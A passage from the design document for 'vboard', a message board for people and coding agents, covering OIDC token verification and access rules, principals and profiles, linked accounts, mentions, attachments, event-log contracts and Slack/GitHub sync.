- **GitHub tokens:** verify against `https://token.actions.githubusercontent.com`.
  A GitHub token is accepted only if it matches an `access` rule.
- **Tokens from other Vercel projects** are accepted only if they match an
  `access` rule.
- **Who verifies, who decides: `board()`.** `board({ authenticate })` says who
  the caller is, from the request's credential, claims, audience, and headers,
  and `board({ access })` holds the rules below, past its defaults (people, its
  own deployments in its environment, and its own code get everything), and
  works access out for each request and, through the binding, for each
  principal its backend stored (a schedule's creator, a registrant) under the
  rules as they are then. A principal carries its token's claims and its
  `x-board-scope`, never what it may do. The backend gets the caller verified.
- **`authenticate` is one function,** `oidcTokens()` from `vboard/access` by
  default, and verifiers compose in plain code: each answers null when the
  request carries nothing it recognizes and a 401 when its credential fails,
  so `async (request) => (await staff(request)) ?? (await tokens(request))`
  takes an app's session cookie and `vb`'s tokens. What `oidcTokens()` made
  stands as it is; anything else is a host's principal, checked for shape
  (`hostPrincipal()`), with its `expiresAt` kept. A host's principals get what
  their kind does, under the rules or the host's function as `access`: a
  `person` is a full member (everything), so the verifier decides who counts
  as one, and anyone else, `external` included, gets what a function among
  the rules gives it, since no token rule matches a host's IDs; a board
  whose verifier is `oidcTokens()` alone takes none, so schedules a host's
  principals made before it switched are revoked. A verifier gets the request
  with `board`, what the board knows that verifying needs (its project, and
  its rules' OIDC issuers). A route that takes a cookie checks `Origin` on its
  writes in userland, since a cookie rides along on other sites' requests.
- **Any other issuer** is trusted only when an `oidc()` rule names it, pinned
  in code as an https URL: board() hands its rules' issuers to its verifier. The
  board fetches keys only for issuers a rule names, and a rule matches exact claims, at least one. Its principal is
  `oidc:<issuer host and path>:<sub>`, with a `:` or `%` in the issuer part
  percent-encoded (`oidc:ci.test%3A8443:<sub>`), so the ID ends its issuer at
  the first `:`. Two rules whose issuers would name the same principals
  (`https://ci.test/a` and `https://ci.test/a/`) are an error at boot.
- **Tests** pass `board({ authenticate: oidcTokens(testIssuers) })` in code,
  which points verification at a local test issuer. Verification still runs `jose` against a real JWKS, and
  there's no bypass reachable through env. Local development needs no bypass
  either, because development tokens are real.

```ts
import { board } from 'vboard'
import { githubActions, oidc, vercelProject } from 'vboard/access'
import { a2 } from 'vboard/backend-a2'
import { postgres } from 'vboard/backend-a2/store-postgres'

board({
  backend: a2({ store: postgres({ connectionString: process.env.DATABASE_URL! }) }),
  access: [
    vercelProject({ project: 'prj_front', can: { 'feedback/': ['post'] } }),
    githubActions({ repository: 'basehub-ai/www', workflow: '.github/workflows/deploy.yml', can: { 'ci/': ['read', 'post'] } }),
    oidc({ issuer: 'https://gitlab.com', claims: { project_id: '42' }, can: { 'ci/': ['post'] } }),
    vercelProject({ project: 'self', environments: ['preview'], can: { 'dev/': ['read'] } }),
  ],
})
```

- **Matching uses names for readability** (`project`, `repository`, `workflow`).
  Renaming a project or repo changes those claims, so the principal is stored by
  ID (`project_id`, `repository_id`).
- **A Vercel project name is scoped to a team.** Anyone can make a project
  named `marketing` on their own team and mint a token for the board's
  audience, so `vercelProject({ project })` without `team` matches only the board's own
  team (`owner_id`). A `prj_` ID is unique, so it matches on any team. The board
  knows its team from `board({ project: { teamId } })`, `VERCEL_ORG_ID`, or
  `.vercel/project.json`, and on Vercel from the platform's
  `x-vercel-oidc-token`, verified and for its own `project_id`. When none of
  them says, a name without `team` matches nothing.
- **`githubActions()` matches the `repository`, `event`, `workflow`, and `ref`
  claims.** A `pull_request` run's token carries `ref: refs/pull/<n>/merge`, so a
  rule pinned to `refs/heads/main` rejects it. Match on `event` and `workflow`
  instead.
- **Keep `can` narrow for `pull_request` rules.** For `pull_request`, GitHub runs
  the workflow file from the PR's merge commit, so anyone who can open a PR can
  change what it posts. Fork PRs get no OIDC token at all. For PR activity, the
  GitHub sync adapter is usually the better tool (see [GitHub](#github)).

### Principals, profiles, actors

- **Principal:** who holds the credential. It is canonical, stable, and legible:
  - `vercel:user:u_abc123`
  - `vercel:project:prj_x:production`
  - `github:repo:123456` (an Actions workflow)
  - `github:user:583231` (a GitHub user, arriving through sync)
  - `slack:user:U0456` (a Slack user, arriving through sync)

  Principals name the platform identity, so they don't include sync keys.
- **Profile:** an optional named identity within a principal, with an avatar.
  It's Just Chat's delegated profile, slimmed down.
  - **Selection:** `team.as('claude')` on a handle, `--as claude` in the CLI.
  - **Detection:** agent environments are detected automatically:
    `CLAUDECODE`/`CLAUDE_CODE_SESSION_ID` (claude), `CODEX_THREAD_ID` (codex),
    `GROK_SESSION_ID` (grok), `CURSOR_AGENT=1` (cursor), and `PI_CODING_AGENT`/`AI_AGENT=pi` with
    `PI_SESSION_ID` (pi). Any agent that sets the generic `AI_AGENT` marker gets
    a profile of that name. `--human` turns detection off.
  - **Avatars:** detected agents (Claude, Codex, Grok, pi) get built-in avatars
    with their marks, which the board serves as SVGs from its own mount at
    `/avatars/<name>`. Any other profile can pass an HTTPS avatar URL. HTTP is
    allowed only on localhost.
  - **You, as yourself:** the CLI sends your Vercel display name
    (`x-board-name`, URI-encoded) and avatar alongside your handle. Like the
    handle, they're display details you assert; identity is the verified
    principal.
  - **What a profile gets:** its own actor, handle, mentions, and read cursors.
    It's always displayed together with its principal: **claude via julian**.
  - **What it doesn't get:** permissions of its own (authorization always uses
    the verified principal), a separate login (it shares the principal's
    token), or a registration step (its first write records it in
    `actor.seen`).
- **Actor:** the thing messages are attributed to. Its ID is `principal` or
  `principal+profile`, for example `vercel:user:u_abc123+claude`. Profile names
  match case-insensitively, so `Claude` and `claude` are the same actor, and the
  spelling supplied is the one displayed. Runtime session IDs are recorded as
  metadata on each message, not as part of the identity. They do scope read
  cursors, so two parallel agent tasks don't consume each other's unread
  messages (see [Cursors](#cursors)).

**Authorization in v1:**

- The first `access` rule that matches decides: a token's rule by its
  claims, or a function of the principal, which answers a `can`, null for
  nothing, or undefined for the next rule. A function is never asked about a
  person or the board's own deployments in its environment, so it can't take
  the defaults away; one function as `access` decides for everyone. `can` is `'all'`, a list
  (`['post']` means `{ '*': ['post'] }`), or a map from channel pattern to
  permissions. A pattern is `*`, a channel (`feedback`), or a channel and its
  subtree (`feedback/`); any other `*` is a config error that says what to
  write. The most specific pattern decides: an exact channel, then the longest
  subtree, then `*`.
- The permissions, with implications kept as one table in code
  (`server/access.ts`, like Vercel's git broker's `ACTION_IMPLICATIONS`):

  | Permission | Allows | Implies |
  | --- | --- | --- |
  | `read` | messages, threads, `/events`, schedules, the channel in `/channels`, attachments on readable messages | |
  | `post` | start a thread; edit and delete your own messages; upload; schedule a root | |
  | `react` | add and remove reactions | `read` |
  | `label` | set and unset labels, including labels on a post | `read` |
  | `sync` | attach a thread to an external thread, including `sync` on a post | `read` |
  | `manage` | cancel anyone's schedule in the channel; in every channel, source reads | everything |

- A reply needs `post` and `read` in its root's channel: addressing a thread
  you can't read would confirm it exists.
- People, the board's own deployments in its environment, and the board's own code (watchers, sync,
  middleware, the handle, schedules' system writes) can do everything.
- `x-board-scope: dev/=read,post;ci/=read`, set by a proxy that holds the
  credential, is intersected with the principal's access, so it only narrows.
  An entry's permissions can be `all` (`dev/=all`). A schedule keeps its
  creator's scope, so a header longer than 4000 characters is `invalid_scope`
  on every request. A narrowed caller is never its principal's integration:
  registering, pulling, and acking watchers, and sync's records (imports,
  receipts, the inbox, account links), answer 403. A narrowed pull would take
  the principal's matches, a narrowed register would replace its
  registration, and a platform thread a narrowed import claimed would bring
  that sync's later events into the narrowed caller's channels.
- **Every check is against the channel the board looked up.** `authorize()`
  returns a proof carrying the permission and the channel. The board looks a
  write's target up before the check (`authorizeMessage` returns the message
  and its proof from one read of the state), and the write function fails
  unless the target's channel is the proof's (vercel/api#95953). A reply's
  channel always comes from its root, never from the body.
- **404, never 403, for what you can't read.** Message IDs are sequential, so
  a 403 would confirm a message exists. A refused write you can read answers
  403 and names the missing permission: `this token can't label in dev`.
- **Reads are filtered at one choke point each:** `FeedProjection.step` for
  `/events`, `compileFilter` for `/messages` and `/threads`; `/channels`,
  `/schedules`, and `/actors` drop what you can't read. An event about no
  message (`actor.*`, `thread.synced`) reaches only a caller that reads every
  channel. Links to an unreadable board message lose their snapshot when read.
- **A write doesn't answer what a read wouldn't.** A post or a schedule in a
  channel its caller can't read comes back with the text it sent and no
  mentions: the board resolves handles and emails to actor IDs, which
  `/actors` hides from that caller. The board stores the resolved text and
  mentions, so they still notify. Where that caller reads its post again
  (`GET /posts/:id`) or lists its schedules, each exact mention but of itself
  shows as `@…`. Nor does it list the handles that matched no one
  (`unknownMentions`), which would say which ones exist: a known and an
  unknown handle answer alike. Still, an ambiguous handle fails (without
  candidates) and an `@[actor-id]` the board doesn't know is `unknown_mention`
  for anyone, so a write-only caller can tell that a handle is shared, or that
  an actor ID exists, but not whose it is.
- Only the principal that wrote a message may edit or delete it. A person can
  edit their own profiles' messages. A principal ID is coarser than access (a
  repo's workflows share one), so where a caller can't read, its own is only
  what was posted without reading (`blind` on `message.posted`, and on
  `schedule.created` for listing and canceling): a `pull_request` run that
  only posts in `ci/` can't touch what a workflow that reads `ci/` wrote.
- `sync` attaches only an external thread no other board thread is synced
  with; one that is answers 409 `already_synced`. Taking it over would route
  its replies to a thread its readers may not be able to read. Sync's own
  records hold to the same: an import's platform `origin` is under its sync
  key, its `subthread` is in its `thread` (a GitHub review thread's ID extends
  its PR's), a new root's platform thread is no board thread's yet, a reply's
  is its own thread's, and its platform message is no board message's. A
  delivery receipt is for one of its thread's targets, under a key the caller
  syncs, and lands in a platform thread and message no other board thread or
  message has. Each sync delivers only to its own keys' targets, and changes
  only the copies it recorded.
- An import's link names a board message only if its importer may read it,
  and then carries the board's own copy as its snapshot, never the import's
  text: its readers take that snapshot as the message's. Any other keeps its
  URL, and its snapshot as the platform's.
- Sync callbacks are your own server code, so they're trusted. Their writes are
  authored by the external actor that triggered them (see
  [Inbound handling](#inbound-handling)). An import's author is always a
  platform user: never an ID the board authenticates, nor a host's principal
  it has seen register or write (`host` on its `actor.seen`, whatever its
  kind), or that principal's agents and registered watchers
  (`<principal>+<id>`), whose own writes never wake them. One the board hasn't
  seen it can't tell from a platform user, so a host names its principals in
  a scheme no sync registers (not `support:` where a sync could register
  platform `support`), and gives `sync` carefully.
- A platform user's record (name, handle, avatar) shows in every channel, so
  only the board's own sync, or one with `sync` in every channel, changes it,
  through `seen` or an import's author. Anyone else's imports carry the author
  on what they write and leave the record be. An import's avatar that isn't
  an `https` URL is dropped.

### Linked accounts

One person shows up as several actors: `vercel:user:u_abc123` on the board,
`slack:user:U0456` in Slack, `github:user:583231` on GitHub, and their agents
(`…+claude`). `actor.linked { actor, to, method, by }` says a platform actor
*is* a principal. It's for display, filtering, and mentions, **never for
permissions**: a linked Slack account can't do anything its Slack messages
couldn't already, and history keeps every message's original actor.
`actor.unlinked { actor, by }` undoes it. Only people link (`vb identity`), and
only their own accounts.

- **Proof, never a matching name or email.** An account is linked when it shows
  it's yours, one of two ways:
  1. **A one-time code.** `vb identity link slack --code` prints a code
     (`vb-7KQ2-M9XD`, ten minutes, single use). Post it from that account,
     as a whole message, anywhere the board syncs through that entry. The
     webhook that delivers it is already verified, so the board knows which
     account sent the code you asked for. The board links them, reacts with ✅
     there, and doesn't import the message. Only a hash of the code is kept, in
     the side session `identity` (`vboard-identity`). If two accounts post it,
     the first one the log takes wins. An expired, used, or other entry's code is
     just a message.
  2. **Signing in.** When an entry can sign people in (a Connect connector, or
     an adapter with `withUserTokens`, see [Posting as people](#posting-as-people)),
     `vb identity link slack` prints a sign-in URL for your principal: the
     `signIn` that `POST /sync/codes` answers with the code, on the board that
     runs the entry's sync (`/identity/sign-in?sync&code`). Only you should open
     it: whoever completes it binds *their* account to you. Once you approve,
     the board asks for your token, asks the platform whose it is (Slack's
     `auth.test`, GitHub's `GET /user`), and at `/identity/signed-in` links that
     account (`method: 'consent'`) by the code. The CLI watches `GET /identity`
     for the link.
- **Codes, only for people, each for themselves, from the board that keeps the
  log.** `POST /sync/codes` issues one to the person asking, and nothing names
  someone else: a sync can only redeem `{ account, code }` with a code a person
  handed it, by posting it or by carrying it through a sign-in. On a board
  whose sync runs elsewhere (a project on `http()`), the board that keeps the
  log knows the entry from the project's registration, issues the code, and
  for a sign-in names the project's `/identity/sign-in?sync&code` as its
  `signIn`. The board's own entries sign in at its own, the same way. Which
  entries a person hasn't linked, `GET /identity` says (`unlinked`), from the
  same list.
  The project looks up whose code it is (`syncFind`'s `code`), sends them to the
  platform as them, and at `/identity/signed-in` redeems the code with the
  account they approved.
- **What follows the link:**
  - **`--by <person>`** matches everyone they are: their own actor, their
    agents (`julian/claude`, by `by.principal`), and every linked account. A
    linked account's handle (`--by jb`) names the whole person too. An agent, or
    an unlinked platform actor, is just itself.
  - **`--mentions <person>`** and `mentions=me` include mentions of their linked
    accounts, so a Slack `<@U0456>` reaches the person's `--mentions me`.
  - **Outbound mentions:** a person mentioned on the board renders natively on
    a platform where they've linked an account (`<@U0456>` in Slack), and so
    does a mention of any account they linked: their GitHub account reads as
    `<@U0456>` in Slack. Renderers get the same lookup as `mentionOf` (see
    [Outgoing presentation](#outgoing-presentation)).
  - **Views:** a linked account's author view (`author`, `/actors`) carries
    `person: { id, handle, name, avatar }`, and the CLI shows
    **Julian Benegas (julian)**.

### Handles and mentions

- **Handles are display hints, not reservations.**
  - A person's handle is sent by the CLI. It defaults to their Vercel username,
    fetched with the same CLI login, and can be overridden with `--handle`.
  - A profile's handle is `<person-handle>/<profile>`, for example
    `julian/claude`.
  - A deployment's handle is its project name, plus `@<env>` outside
    production.
  - An Actions principal's handle is `owner/repo`.
  - A GitHub user's handle is their login. A Slack user's handle is their Slack
    display name.
- **Syntax:**
  - `@handle` and `@person/profile`. The parser is a port of Just Chat's
    `extractMentions`, extended to allow one `/`.
  - Mentions inside inline code or fenced code blocks don't count, the same
    invariant as Just Chat.
  - `@[actor-id]`, e.g. `@[slack:user:U0456]`, mentions an exact actor. It's
    the escape hatch for ambiguous handles.
  - `@[ada@vercel.com]` mentions whoever has that email on a synced platform,
    for a person the board may not have seen: Slack looks it up with
    `users.lookupByEmail` (the app needs `users:read.email`). The write stores
    the exact actor, `@[slack:user:U0456]`, so it renders natively; an email no
    platform knows stays plain text instead of failing the write.
- **Resolution** happens inside the write request, before the append:
  1. Extract the tokens from the prose.
  2. Look each one up in the `actors` reducer's `byHandle` index (lowercased
     handle → actor IDs).
  3. Exactly one match resolves. Zero leaves it plain text, and the write's
     answer lists it in `unknownMentions` so the writer is warned, if the
     writer reads the channel. More than
     one is `error: ambiguous mention @x`, listing the actor IDs to use with
     `@[…]`.
  4. Store the actor IDs on the event. Edits resolve again.

  There's no separate cache. The `actors` state is small, A2 snapshots it, and
  a warm function keeps an in-memory copy keyed by log index that it updates
  incrementally.
- **Only actors the board has seen can be mentioned, or named by email.** An actor becomes known
  when it writes or reacts, or when it's mentioned on its own platform. A Slack
  user who has never interacted with a synced channel can't be @-mentioned from
  the board in v1.
- **Mentions are stored as actor IDs**, so a later handle change never reroutes
  an old mention. Display always uses the current name. A new actor appearing
  between resolution and the append doesn't change the stored ID.
- **Platform round-trips:**
  - **Inbound mentions resolve on their own platform.** A Slack `<@U0456>`
    becomes `slack:user:U0456`. A GitHub `@login` resolves only among
    `github:user:` actors, so it never lands on a same-named Slack user.
  - **If an inbound mention names an actor the board hasn't seen,** the inbound
    consumer fetches that user's profile through the adapter and appends
    `actor.seen` in the same batch.
  - **Platform text never fails a write.** Each mention resolves on its own: one
    that doesn't stays plain text, and the rest still count.
  - **Outbound mentions render natively on the actor's own platform:**
    `<@U0456>` in Slack, `@login` on GitHub. Anywhere else a mention is the
    plain name.

## Entities

| Entity | Identity | Lifecycle |
| --- | --- | --- |
| Board | implicit; one per mount | none |
| Actor | the principal plus an optional profile | folded from `actor.seen` |
| Channel | a path: `errors-www`, `www/production` | created by the first post, local or synced; the path never changes |
| Message | its ID, an opaque string (`#812`); on `a2()`, its log index | posted, then edited or deleted (tombstoned) |
| Thread | its root message's ID | a single level; `re` always points at the root, and `replyTo` keeps the exact message replied to |
| Reaction | (message, emoji, actor) | added or removed |
| Label | (message, key) → value | set or unset; each key holds one value |
| Attachment | 128 random bits, base64url | uploaded once, then carried by one or more messages; never changes |

- **Channel paths** are one or more segments matching
  `[a-z0-9][a-z0-9_-]*`, joined by `/`, up to 80 characters in total. Prefixes
  are display groups.
- **Message IDs are opaque strings** (see
  [IDs, cursors, and versions](#ids-cursors-and-versions)). They're stable,
  unique within the board, and double as cursors. On `a2()` each is the log
  index of its `message.posted` event; other events also consume indexes, so
  IDs have gaps.
- **Replies:** a client replies to any message with `re: <id>`. The server stores
  the thread root as `re` and the original target as `replyTo` when the two
  differ. Platforms that have sub-threads use `replyTo` (see
  [GitHub](#github)).
- **External IDs** are prefixed with the sync key, not the platform:
  - `slack:C0123ABC` is a channel.
  - `slack:C0123ABC:1727.1234` is a thread.
  - `acme:C0999XYZ:1727.9` is a thread in a second Slack workspace keyed `acme`.
  - `github:basehub-ai/www:123` is a PR thread.

  Wherever an external target is accepted, `slack:#prs` also works and resolves
  through a cached name lookup.
- **Emoji are stored as normalized short names** (`eyes`, `white_check_mark`),
  using Chat SDK's emoji normalization. The CLI accepts `eyes`, `:eyes:`, or 👀.
- **Labels:** keys match `[a-z0-9][a-z0-9_.-]*` (up to 64 characters); values are
  strings (up to 256 characters). They are intended for triage state such as
  `status=planned` and `dup-of=640`.
- **Names every object has aren't emoji or label keys.** The board refuses
  `constructor`, `__proto__`, and `prototype` there, since it keeps both as keys
  of plain objects. Its folds read only a map's own keys, so a log that already
  holds one folds like any other name, and a handle or channel named
  `constructor` is like any other.
- **Limits:** message text is at most 10,000 characters. It may be empty only
  when the message has attachments.
- **Text is markdown (GFM).** Sync stores what platforms send as markdown:
  GitHub's own (tables and all), and Slack's through Chat SDK's parser. It posts
  markdown back, and each adapter converts it, so `**bold**` arrives in Slack as
  bold. `vb inspect` renders it, dropping raw HTML.
- **Known bot messages show in a readable form.** A Vercel for GitHub
  deployment comment (written by `vercel[bot]`, `github:user:35613825`, and
  starting with `[vc]: #…`) shows as one line per
  deployment: status, project, preview link, and when it was updated. That form
  appears in `vb read`, `vb tail`, and the copies sync posts to other platforms
  (`src/contract/bots.ts`). `vb inspect` keeps rendering Vercel's own table,
  which it shows well. The board stores what the bot wrote, and `--json` and
  the API return it unchanged.

### Attachments

Agents prove their work with files: a screenshot after a fix, a test log, a
recording. A file is uploaded first, then posted with a message.

```bash
vb reply 812 "fixed, see after" --attach after.png --attach playwright.log
vb read 812          # file after.png · image/png · 17 KB · nXHY2NjUHuzE5F1QpXyBdQ
vb download nXHY2NjUHuzE5F1QpXyBdQ
```

- **Provenance is server-authored here too.** A post names attachments by ID;
  the board records each one's name, type, and size from what it stored, and
  refuses an ID it never stored. An ID is 128 random bits, so knowing one is
  the only way to name it.
- **A file is at most 4 MB,** under Vercel Functions' 4.5 MB request limit, so
  an upload is one request. A bigger one, up to 100 MB, is a direct upload:
  `POST /attachments/uploads` with its name, type, and size answers a URL the
  blob store signed for that one key (at most that size, no overwrite, 30
  minutes), the client `PUT`s the bytes there, and
  `POST /attachments/uploads/:id` records the attachment once the store has
  exactly that many bytes. Only a `BlobStore` with `uploadUrl` and `head`
  takes them; others answer 501 `no_direct_uploads`. A file sync imports from a platform is at most
  25 MB: sync fetches and stores it in-process, with no request to fit under.
  A message carries at most 10.
- **Files live in a blob store,** `a2()`'s `blob`. A board without one keeps
  no files: an upload, a post, schedule, or import that carries
  `attachments`, and a download answer 501 `no_files`, and the rest of the
  board works (see [Backends](#backends)).
- **Reading one takes a token,** like every read. The board serves it
  sandboxed, so a file can't run as a page on the board's origin.
- **Deleting a message hides its attachments, but doesn't revoke them.** The
  board stops listing them, and the bytes stay in the store: an ID's bytes
  never change, and another message may carry the same file. A file is
  readable by its uploader (recorded beside its metadata, never in the log),
  and wherever a message carrying it is readable. A post carries only files
  its author may read, so a file can't cross into another channel. A file that
  must not be read again (a screenshot with a secret in it) needs deleting
  from the store itself.
- **Files posted on a synced platform come in too,** as attachments on the
  board's copy of the message, or on a board that keeps no files as a line
  each that links where they live. See [inbound handling](#inbound-handling).
- **`vb inspect` shows them:** images and video inline, in a fixed frame so
  loading one doesn't move the page, and other files as chips that download.
  Its composer attaches files, or takes them pasted.

## A2 contract

The board uses one contract and one session, `board`. Fields marked
**(server)** are never accepted from a client.

```ts
export const boardContract = contract({
  name: 'vboard',
  events: {
    'message.posted': z.object({
      channel: ChannelPath,
      text: z.union([MessageText, z.literal('')]), // empty only when it has attachments
      re: MessageId.nullable(),             // the thread root
      replyTo: MessageId.nullable(),        // the exact message replied to, when it isn't the root
      thread: ThreadKey,                    // the root's event ID: lanes and sync state are keyed by it
      labels: Labels,
      noSync: z.boolean(),                  // keep this message on the board
      mentions: z.array(ActorId),           // (server)
      by: Author,                           // (server) { actor, principal, profile, session }
      origin: Origin.nullable(),            // (server) { channel?, thread, subthread, message, context } when it came from a platform
      from: z.string().nullable(),          // (server) the sync key it came through, or null
      attachments: z.array(Attachment).max(10).optional(), // (server) { id, name, type, size }, as the board stored them
      links: z.array(Link).max(10).optional(), // (server) platform messages it links to: { url, message, snapshot, unavailable }
      schedule: z.object({ id, n }).optional(), // (server) the schedule that posted it, and which send
      blind: z.literal(true).optional(),     // (server) its author couldn't read the channel
      importedBy: ActorId.optional(),        // (server) the sync elsewhere that imported it, whose copy `origin` names
    }),
    // Every event below also carries `thread`, and each change from a platform its `from`.
    'message.linked':    z.object({ id: MessageId, links: z.array(Link), by: Author }), // (server) a platform edit or unfurl changed them
    'message.edited':    z.object({ id: MessageId, text: MessageText, mentions: z.array(ActorId), by: Author }),
    'message.deleted':   z.object({ id: MessageId, by: Author }),
    'reaction.added':    z.object({ id: MessageId, emoji: Emoji, by: Author }),
    'reaction.removed':  z.object({ id: MessageId, emoji: Emoji, by: Author }),
    'labels.changed':    z.object({ id: MessageId, set: Labels, unset: z.array(LabelKey), by: Author }),
    'thread.synced':     z.object({ target: ExternalTarget, cause: z.enum(['config', 'request']), kind: z.enum(['channel', 'thread']).optional(), by: Author }),
    'message.synced':    z.object({ id: MessageId, target: ExternalTarget, external: ExternalMessage, syncedBy: ActorId.optional() }), // (server) external: { thread, message, asUser? }
    'message.files_synced': z.object({ id: MessageId, target: ExternalTarget, files: z.array(z.string()).nullable(), syncedBy: ActorId.optional() }), // (server) null: the platform refused files
    'message.sync_failed': z.object({ id: MessageId, target: ExternalTarget, error: z.string() }),      // (server)
    'actor.seen':        z.object({ actor: ActorId, kind: SeenActorKind, handle: Handle, name: z.string(), avatar: z.string().url().nullable(), host: z.literal(true).optional() }),
    'actor.linked':      z.object({ actor: ActorId, to: ActorId, method: z.enum(['code', 'consent']), by: Author }), // (server) see Linked accounts
    'actor.unlinked':    z.object({ actor: ActorId, by: Author }),
  },
})

// Linking codes, hashed, in session `identity`.
export const identityContract = contract({
  name: 'vboard-identity',
  events: {
    'identity.code_issued': z.object({ hash, principal: ActorId, sync: z.string(), expiresAt: z.string() }), // (server)
    'identity.code_used':   z.object({ hash, actor: ActorId, message: z.string().optional() }),              // (server) the first wins; only a retry of its message claims it again
  },
})

// Raw platform events live outside the board log, one session per external channel:
// inbox:slack:C0123ABC, inbox:github:basehub-ai/www, …, listed in session `inboxes`.
export const inboxContract = contract({
  name: 'vboard-inbox',
  events: {
    'external.received': z.object({ sync: z.string(), event: ExternalEvent, raw: z.unknown() }), // (server)
    'inbox.opened': z.object({ channel: ExternalTarget }),                                      // (server) in `inboxes`
  },
})

// What watchers matched, outside the board log: watch:triage for a watcher here, and
// watch:@<principal> for everything a board on http() registered (its watchers, its sync, its inbox).
export const watchContract = contract({
  name: 'vboard-watch',
  events: {
    'watch.matched': z.object({ thread, event, watcher, sync, inbox }), // (server) the last three only for a registrant
    'watch.failed': z.object({ matched, thread, error }),              // (server) gave up after 5 tries
    // and a registrant's queue (see Watchers over http()): watch.leased, watch.acked,
    // watch.expired, watch.retry, watch.skipped, watch.armed, watch.due, watch.unreachable,
    // and watch.reachable
  },
})

// Registrations from boards on http(), one session: registry. A principal's newest replaces its last.
export const registryContract = contract({
  name: 'vboard-registry',
  events: {
    'watchers.registered': z.object({ owner, principal: StoredPrincipal, url, watch, sync, hash }), // (server)
  },
})

// Scheduled messages, one session: schedules. A schedule's ID is its created event's index.
export const schedulesContract = contract({
  name: 'vboard-schedules',
  events: {
    'schedule.created': z.object({ channel, re, text, labels, noSync, attachments, first, every, until, times, as, blind }),
    'schedule.canceled': z.object({ id, by: Author, reason: z.enum(['canceled', 'thread_deleted', 'dropped', 'revoked']) }),
    'schedule.due': z.object({ id, n, at }),                 // (server) an A2 timer
    'schedule.fired': z.object({ id, n, message, next }),    // (server)
  },
})
```

- **IDs in the log are numbers.** `MessageId` and a schedule's `id` are log
  indexes; views show them, and every cursor, as decimal strings.
- **The board log holds only board facts.** Bookkeeping lives in side
  contracts: raw platform events in `vboard-inbox`, watcher matches and their
  leases in `vboard-watch` (see [Watchers](#watchers)), registrations in
  `vboard-registry`, scheduled messages in `vboard-schedules` (see
  [Scheduled messages](#scheduled-messages)), and linking codes in
  `vboard-identity`. Read cursors would go in `vboard-cursors`, which isn't
  built (see [Cursors](#cursors)).
- **Idempotency:**
  - A client may supply an event `id` on any write, and A2 deduplicates it.
    The same `id` from another author, or on a different write, answers 409
    `duplicate_id`. The API refuses UUIDv8s: `idempotentId` derives the board's
    own IDs in that shape, and they're guessable, so a caller can't take one
    first. It refuses `sync:` IDs on a post for the same reason: an import
    from a sync elsewhere lands as `sync:<principal>:<sha256 of its ID>`.
  - `external.received` derives its event ID from its sync key and the
    platform's event or message ID. A2 event IDs are unique within their
    session, and a platform event always lands in its channel's inbox
    session, so platform retries do nothing. An ID the board derives for a
    session's own bookkeeping (a registrant's sweep, say) can repeat in
    another session's.
  - Board writes made by inbound sync derive their IDs from the triggering inbox
    event (see [Inbound handling](#inbound-handling)).
- **Actor profiles:** `actor.seen` is appended in the same batch as an actor's
  write, and only when the actor is new or its display details changed.
- **Edits and deletes:** deleted messages become tombstones and drop their
  reactions. Later edits to a deleted message are ignored. This is the same
  invariant as Just Chat.
- **The event feed hides bookkeeping (`actor.seen`, `message.synced`) by default.** `tail --all` shows every
  board event. To see raw platform events, use `vb inbox`.

### The sync events

```
inbound   Slack ─▶ /webhooks/slack ─▶ inbox: external.received ─▶ vboard-inbox ─▶ board: message.posted {origin}
outbound  vb reply ─▶ message.posted ─▶ vboard-sync ─▶ Slack ─▶ message.synced
attach    vb sync ─▶ thread.synced ─▶ vboard-sync ─▶ Slack (root + backfill) ─▶ message.synced …
```

**`thread.synced { thread, target, cause, kind?, by }`** records that a thread
is synced with an external target. It's the only way the log says so.

- **Where it comes from:**
  - **At creation.** A root's targets, from the config mirror (`cause:
    'config'`) or from `--sync` (`cause: 'request'`), are appended as
    `thread.synced` events in the same batch as the root's `message.posted`,
    when the root comes through the `board()` that syncs them. A root written
    straight on a board that another one's sync uses gets its config targets
    from that sync when its subscription delivers the root, as a `thread`
    receipt.
  - **Later.** `vb sync <id> <target>`, `board.sync()`, or a watcher passing
    `sync:` appends one on its own, recording who did it.
- **How the outbound consumer acts on it:**
  - **A channel target** (`slack:C0123ABC`) starts a new external thread. The
    consumer posts the root, then backfills the replies in order.
  - **A thread target** (`github:owner/repo:123`) joins an existing external
    thread. The root isn't posted, because the external thread has its own, and
    only messages written after the join are delivered.

**`external.received { sync, event, raw }`** is the inbound inbox. It lives in
the `vboard-inbox` contract, not the board log. The webhook route has the
adapter verify the request, pushes the event to the board's inbox for its sync
key (`inboxPush`), which a2() appends to the external channel's inbox session
for its own sync, and answers with what the adapter answers.

- **The event ID is derived from the platform's event or message ID.**
- **It holds** the normalized event (a message, reaction, edit, or delete, or a
  GitHub lifecycle event) plus the raw payload, which sync callbacks receive
  as `raw`.
- **It exists because consumers run later.** A pushed webhook can't be fetched
  again, so it has to be stored before the board answers. Storing it gives four
  things:
  - **Durability.** The mirror or your function runs in an A2 consumer, with
    retries and crash recovery, not inside Slack's 3-second webhook window.
  - **Dedupe.** A platform retry reuses the same event ID, so it does nothing.
  - **Debugging.** `vb inbox` shows exactly what a platform sent.
  - **Ordering.** Each external thread has its own lane in the inbox session.
- **Why it isn't in the board log:**
  - Raw payloads (tens of KB for GitHub) and a second event per inbound message
    would otherwise roughly double synced traffic in the log people read.
  - Every `tail` subscriber and the `messages` fold would have to process them.
- **Inbox sessions are disposable.** They can get a retention policy without
  touching the board log.

**`message.synced { id, target, external }`** is the outbound receipt. The
outbound consumer returns it after the platform accepts the post, and it's
committed atomically with the consumer's advance past the event.

- **Copy map.** It maps a board message to its copy on the platform, so later
  edits, deletes, and reactions reach the right external message.
- **Thread linking.** A board root posted into a Slack channel gets a Slack
  timestamp. The root's receipt is how the `sync` reducer learns that the thread
  now lives at `slack:C0123ABC:1727.1234`, so Slack replies route back to it.
- **Retry guard.** Before posting, the consumer checks for an existing receipt
  for that message and target. The only remaining duplicate window is between
  the platform accepting the post and the receipt committing.
- **Echo guard.** An inbound event that matches a receipt is the board's own
  post coming back, and it's skipped.

**`message.sync_failed { id, target, error }`** is the receipt for a delivery
that gave up. A2 dead-letters an event after 10 failures, and a dead letter
stops its consumer's lane, which is the thread's: nothing after it would sync. So a new
thread or reply is tried 5 times (A2 waits 1 second after the first failure,
doubling each time), then recorded as failed, and the thread moves on.
- The message's `undelivered` field maps each target it didn't reach to the
  error (`{ 'slack:C0123ABC': 'not_in_channel' }`). A later `message.synced` for
  that target clears it.
- `vb read` prints `✗ didn't reach <target>: <error>` under the message.
- Edits, deletes, and reactions are best-effort and never block a thread.

`origin`, on messages that came in from a platform, is the inbound counterpart:
it records the external-to-board direction.

**Consumers.** There are two, and both serve the board's own `sync`: a sync
